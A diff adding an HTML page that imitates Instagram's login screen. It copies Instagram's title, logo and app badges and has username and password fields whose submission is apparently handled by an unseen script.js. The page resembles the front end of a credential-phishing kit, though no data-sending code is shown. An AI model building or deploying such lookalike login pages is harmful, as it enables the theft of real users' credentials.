@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-container">
+            <div class="logo">
+                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+            </div>
+            
+            <!-- Updated form with onsubmit and required fields -->
+            <form class="login-form" onsubmit="return false;">
+                <div class="form-group">
+                    <input 
+                        type="text" 
+                        placeholder="Phone number, username, or email" 
+                        required 
+                        autocomplete="off"
+                        name="username">
+                </div>
+                <div class="form-group">
+                    <input 
+                        type="password" 
+                        placeholder="Password" 
+                        required
+                        autocomplete="off"
+                        name="password">
+                </div>
+                <button type="submit" id="loginButton">Log In</button>
+            </form>
+
+            <div class="divider">
+                <span>OR</span>
+            </div>
+
+            <!-- Replace only the facebook-login div with this updated version -->
+<div class="facebook-login">
+    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
+        <path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96C15.9164 21.5878 18.0622 20.3855 19.6099 18.57C21.1576 16.7546 22.0054 14.4456 22 12.06C22 6.53 17.5 2.04 12 2.04Z"/>
+    </svg>
+    <span>Log in with Facebook</span>
+</div>
+
+            <a href="https://www.instagram.com/accounts/password/reset/" class="forgot-password">Forgot password?</a>
+        </div>
+
+        <div class="signup-container">
+            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+        </div>
+
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-links">
+                <a href="https://apps.apple.com/app/instagram/id389801252">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
+                </a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading spinner overlay -->
+    <div id="loadingOverlay" style="display: none;">
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="script.js"></script>
+</body>
+</html> 
